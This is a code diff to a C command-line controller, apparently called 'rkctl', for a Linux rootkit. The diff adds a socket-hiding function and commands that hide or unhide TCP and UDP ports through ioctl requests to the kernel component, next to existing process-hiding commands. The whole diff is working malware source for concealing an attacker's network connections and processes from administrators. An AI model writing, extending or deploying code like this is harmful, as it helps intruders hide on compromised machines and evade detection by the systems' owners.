@@ -190,6 +190,29 @@ int do_process_hiding(unsigned int request, int argc, const char *argv[]) {
     return do_ioctl_request("hidepid", request, (void *) pid);
 }
 
+int do_socket_hiding(unsigned int request, int argc, const char *argv[]) {
+
+    unsigned short port;
+    char *endptr = NULL;
+
+    if (argc != 3) {
+        printf("[-] rkctl: do_socket_hiding() missing port\n");
+        return -1;
+    }
+
+    /* Parse port */
+    errno = 0;
+    port = (unsigned short) strtol(argv[2], &endptr, 0);
+
+    if (errno != 0  || *endptr != 0) {
+        printf("[-] rkctl: do_socket_hiding() cannot parse port\n");
+        return -1;
+    }
+
+    return do_ioctl_request("hide_socket", request, (void *) port);
+
+}
+
 int main(int argc, const char *argv[]) {
 
     const char *cmd;
@@ -232,6 +255,22 @@ int main(int argc, const char *argv[]) {
     } else if (!strcmp(cmd, "hidepid_rm")) {
 
         return do_process_hiding(RKCTL_HIDE_PID_RM, argc, argv);
+
+    } else if (!strcmp(cmd, "hide_socket_tcp")) {
+
+        return do_socket_hiding(RKCTL_TCP_HIDE, argc, argv);
+
+    } else if (!strcmp(cmd, "unhide_socket_tcp")) {
+
+        return do_socket_hiding(RKCTL_TCP_UNHIDE, argc, argv);
+
+    } else if (!strcmp(cmd, "hide_socket_udp")) {
+
+        return do_socket_hiding(RKCTL_UDP_HIDE, argc, argv);
+
+    } else if (!strcmp(cmd, "unhide_socket_udp")) {
+
+        return do_socket_hiding(RKCTL_UDP_UNHIDE, argc, argv);
 
     } else {
         printf("[-] rkctl: command not supported\n");
